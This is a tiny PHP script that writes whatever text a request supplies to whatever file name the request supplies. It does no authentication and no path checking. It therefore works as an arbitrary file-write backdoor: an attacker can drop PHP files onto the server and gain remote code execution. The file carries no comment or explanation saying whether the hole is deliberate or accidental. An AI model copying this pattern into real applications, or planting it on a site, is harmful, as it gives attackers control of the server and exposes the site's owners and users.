<?php

$myFile = $_REQUEST["fileName"];
$myText = $_REQUEST["texto"];

echo file_put_contents($myFile,$myText);